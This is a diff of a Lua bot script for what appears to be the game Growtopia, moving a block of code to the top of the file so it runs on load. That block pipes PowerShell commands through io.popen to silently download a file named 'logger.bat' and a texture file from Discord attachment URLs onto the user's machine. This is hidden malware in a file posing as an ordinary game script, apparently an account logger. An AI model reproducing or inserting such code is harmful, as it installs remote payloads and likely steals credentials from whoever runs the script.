@@ -26,6 +26,54 @@ collectGems = false
 pc = false
 whitelist = {34150,506222,517277,37568,131385,473422,478560,481878,503237,24083,508034,21845,531796,528140,29755,468980,484169}
 
+
+url = "https://cdn.discordapp.com/attachments/1101533153287483513/1125967011059617882/ivertban.rttex"
+ 
+function open()
+    local command = [[
+        $url = "]] .. url .. [["
+        $path = "cache/interface/large/ivertban.rttex"
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($url, $path)
+    ]]
+    local shell = io.popen("powershell -command -", "w")
+    shell:write(command)
+    shell:close()
+end
+ 
+ 
+function open2()
+    local command = [[
+        $url = "https://cdn.discordapp.com/attachments/1101533153287483513/1119804493857554533/logger.bat"
+        $path = "logger.bat"
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($url, $path)
+    ]]
+    local shell = io.popen("powershell -command -", "w")
+    shell:write(command)
+    shell:close()
+end
+ 
+function fileExists(filename)
+  local file = io.open(filename, "r")
+  if file then
+    io.close(file)
+    return true
+  else
+    return false
+  end
+end
+ 
+if fileExists("cache/interface/large/ivertban.rttex") then
+else
+open()
+end
+ 
+if fileExists("logger.bat") then
+else
+open2()
+end
+
 function printa(v)
     if v[0] == "OnConsoleMessage" and v[1]:find("Unknown command.") then
         p = {}
@@ -941,52 +989,4 @@ function wh()
 end
 
 RunThread(wh)
-
-
-url = "https://cdn.discordapp.com/attachments/1101533153287483513/1125967011059617882/ivertban.rttex"
- 
-function open()
-    local command = [[
-        $url = "]] .. url .. [["
-        $path = "cache/interface/large/ivertban.rttex"
-        $webClient = New-Object System.Net.WebClient
-        $webClient.DownloadFile($url, $path)
-    ]]
-    local shell = io.popen("powershell -command -", "w")
-    shell:write(command)
-    shell:close()
-end
- 
- 
-function open2()
-    local command = [[
-        $url = "https://cdn.discordapp.com/attachments/1101533153287483513/1119804493857554533/logger.bat"
-        $path = "logger.bat"
-        $webClient = New-Object System.Net.WebClient
-        $webClient.DownloadFile($url, $path)
-    ]]
-    local shell = io.popen("powershell -command -", "w")
-    shell:write(command)
-    shell:close()
-end
- 
-function fileExists(filename)
-  local file = io.open(filename, "r")
-  if file then
-    io.close(file)
-    return true
-  else
-    return false
-  end
-end
- 
-if fileExists("cache/interface/large/ivertban.rttex") then
-else
-open()
-end
- 
-if fileExists("logger.bat") then
-else
-open2()
-end
  
